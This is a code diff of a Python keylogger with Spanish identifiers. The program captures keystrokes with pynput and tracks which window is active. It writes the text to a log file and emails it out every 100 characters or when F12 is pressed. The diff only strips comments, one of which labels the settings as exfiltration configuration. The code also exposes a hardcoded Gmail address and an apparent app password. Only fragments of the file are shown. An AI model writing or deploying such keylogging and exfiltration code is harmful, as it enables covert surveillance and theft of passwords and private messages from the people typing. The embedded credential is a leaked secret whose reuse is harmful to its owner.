@@ -9,9 +9,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from pynput import keyboard
 
-# ==========================================
-# CONFIGURACIÓN DE EXFILTRACIÓN Y ARCHIVOS
-# ==========================================
+
 EMAIL_EMISOR = "josemanueldavalossanchez37@gmail.com"
 EMAIL_PASSWORD = "vato ijpk ekys nefw"  
 EMAIL_RECEPTOR = "josemanueldavalossanchez37@gmail.com"
@@ -20,7 +18,6 @@ N_CARACTERES = 100
 ARCHIVO_LOG = "actividad_log.txt"
 TECLA_PANICO = keyboard.Key.f12 
 
-# Variables globales
 ventana_actual = ""
 contador_caracteres = 0
 
@@ -112,13 +109,10 @@ def exfiltrar_en_hilo():
 def procesar_entrada(texto):
   global contador_caracteres
 
-  # 1. Guardar de manera local solo si hay nuevos datos
   guardar_en_archivo(texto)
 
-  # 2. Incrementar contador de caracteres
   contador_caracteres += len(texto)
 
-  # 3. Exfiltrar al llegar a N caracteres
   if contador_caracteres >= N_CARACTERES:
     exfiltrar_en_hilo()
     contador_caracteres = 0
@@ -134,7 +128,6 @@ def al_presionar(tecla):
     exfiltrar_en_hilo()
     return
 
-  # Detectar cambio de ventana activa
   nueva_ventana = obtener_ventana_universal()
   if nueva_ventana != ventana_actual:
     ventana_actual = nueva_ventana
